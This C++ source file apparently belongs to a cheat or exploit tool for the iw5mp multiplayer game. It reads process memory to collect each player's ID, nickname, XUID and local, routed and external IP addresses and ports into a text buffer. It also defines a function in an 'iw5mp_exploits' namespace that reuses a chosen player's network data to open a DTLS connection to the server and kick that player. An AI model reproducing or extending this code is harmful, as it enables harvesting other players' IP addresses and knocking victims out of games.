#include "pch.h"
#include "iw5mp_structs.h"
#include "iw5mp_addresses_declaration.h"
#include "iw5mp_players_functions.h"
#include "TextConvertors.h"
#include "Winsock_ClientController.h"

template<unsigned short TOTALSZ>
class PlayerDataCollector
{
private:
	wchar_t __buffer[TOTALSZ + 1] = { 0 };
	unsigned short m_bufferOffset = 0;
	inline void AppendSymbol(const wchar_t symbol) 
	{
		this->__buffer[this->m_bufferOffset] = symbol;
		this->m_bufferOffset++;
		if (this->m_bufferOffset > TOTALSZ) { this->m_bufferOffset = 0; }
	}
	void AppendString(const std::wstring& str)
	{
		const wchar_t* cnststr = str.c_str();
		for (unsigned short i = 0; i < str.length() && this->m_bufferOffset < TOTALSZ; i++)
		{
			this->__buffer[this->m_bufferOffset] = cnststr[i];
			this->m_bufferOffset++;		
		}
	}
	void AppendString(const uint8_t* str, unsigned short limiter)
	{
		for (unsigned short i = 0; i < limiter && this->m_bufferOffset < TOTALSZ; i++)
		{
			if (str[i]) {
				this->__buffer[this->m_bufferOffset] = static_cast<wchar_t>(str[i]);
				this->m_bufferOffset++;
			}
			else
			{
				this->__buffer[this->m_bufferOffset] = L' ';
				this->m_bufferOffset++;
				break;
			}
			
		}
	}
public:
	PlayerDataCollector()
	{
		for (unsigned short i = 0; i < TOTALSZ+1; i++)
		{
			this->__buffer[i] = 0x00;
		}
		this->m_bufferOffset = 0;
	}
	~PlayerDataCollector() = default;
	void StartCollecting() noexcept { this->m_bufferOffset = 0;  }
	void Collect_PlayerID(const uint32_t& id)
	{
		this->AppendString(textconvertors::ret_stdstring::ConvertDecTypeU32ToWText(id));
		this->AppendSymbol(L' ');
	}
	void Collect_Nickname(const uint8_t* arr)
	{
		this->AppendString(arr, sizeof(iw5mp_structs::PlayerInfo_1::name));
		this->AppendSymbol(L' ');
	}
	void Collect_XUID(const uint64_t& xuid)
	{
		const uint32_t* xxuid = reinterpret_cast<const uint32_t*>(&xuid);
		this->AppendString(textconvertors::ret_stdstring::ConvertHexTypeU32ToWText(xxuid[0]));
		this->AppendSymbol(L'|');
		this->AppendString(textconvertors::ret_stdstring::ConvertHexTypeU32ToWText(xxuid[1]));
		this->AppendSymbol(L' ');
	}
	void Collect_Netdata(iw5mp_structs::playerNetData* nd)
	{
		this->AppendString(textconvertors::ret_stdstring::ConvertIPToWText(nd->local.ip));
		this->AppendSymbol(L':');
		this->AppendString(textconvertors::ret_stdstring::ConvertDecTypeU16ToWText(nd->local.port));
		this->AppendSymbol(L'|');
		this->AppendString(textconvertors::ret_stdstring::ConvertIPToWText(nd->route1.ip));
		this->AppendSymbol(L':');
		this->AppendString(textconvertors::ret_stdstring::ConvertDecTypeU16ToWText(nd->route1.port));
		this->AppendSymbol(L'|');
		this->AppendString(textconvertors::ret_stdstring::ConvertIPToWText(nd->route2.ip));
		this->AppendSymbol(L':');
		this->AppendString(textconvertors::ret_stdstring::ConvertDecTypeU16ToWText(nd->route2.port));
		this->AppendSymbol(L'|');
		this->AppendString(textconvertors::ret_stdstring::ConvertIPToWText(nd->external.ip));
		this->AppendSymbol(L':');
		this->AppendString(textconvertors::ret_stdstring::ConvertDecTypeU16ToWText(nd->external.port));
	}
	void AppendNewLine() 
	{
		this->AppendSymbol(L'\r');
		this->AppendSymbol(L'\n');
	}
	const wchar_t* FinishCollecting() noexcept { this->__buffer[TOTALSZ] = 0;  return this->__buffer; }
};

PlayerDataCollector<iw5mp_getdata::players_data::XUIDandNETData_BUFFER_SIZE> Collector;

const wchar_t* iw5mp_getdata::players_data::GetPackedData_XUIDandNETData()
{
	iw5mp_structs::PlayerInfo_1* pPInfo = reinterpret_cast<iw5mp_structs::PlayerInfo_1*>(
		iw5mp_addresses::cgameGlob
		+ offsetof(iw5mp_structs::cgameGlob, snapshotEntry)
		+ offsetof(iw5mp_structs::cgameGlobstruct_snapshotEntry, x18_PlayerInfo));
	iw5mp_structs::gamesession_unkstruct24b* p24b = reinterpret_cast<iw5mp_structs::gamesession_unkstruct24b*>(
		iw5mp_addresses::PlayersData_xuid
		);
	iw5mp_structs::playerNetData* pNETData = reinterpret_cast<iw5mp_structs::playerNetData*>(
		iw5mp_addresses::PlayersData_netdata
		);
	Collector.StartCollecting();
	for (unsigned char i = 0; i < MAXPLAYERS; i++)
	{
		Collector.Collect_PlayerID(pPInfo[i].id);
		Collector.Collect_Nickname(pPInfo[i].name);
		Collector.Collect_XUID(p24b[pPInfo[i].id].xuid);
		Collector.AppendNewLine();
		Collector.Collect_Netdata(&pNETData[pPInfo[i].id]);
		Collector.AppendNewLine();
	}
	return Collector.FinishCollecting();
}


void iw5mp_exploits::KickUserViaND(uint32_t playerindex)
{
	if (playerindex > 17) { return; }
	iw5mp_structs::playerNetData* pNETData = reinterpret_cast<iw5mp_structs::playerNetData*>(
		iw5mp_addresses::PlayersData_netdata
		);
	sockaddr_in addr;
	iw5mp_structs::gameSession* ptrGS = reinterpret_cast<iw5mp_structs::gameSession*>(iw5mp_addresses::gameSessionStruct);
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = *(ULONG*)ptrGS->serverinfo.ND.external.ip;
	addr.sin_port = htons(ptrGS->serverinfo.ND.external.port);
	Winsock_ClientController::Winsock_ClientC0ntroller().GetClient()->SetPlayerNetData(pNETData[playerindex]);
	Winsock_ClientController::Winsock_ClientC0ntroller().GetClient()->doDTLSconnect(&addr);

}
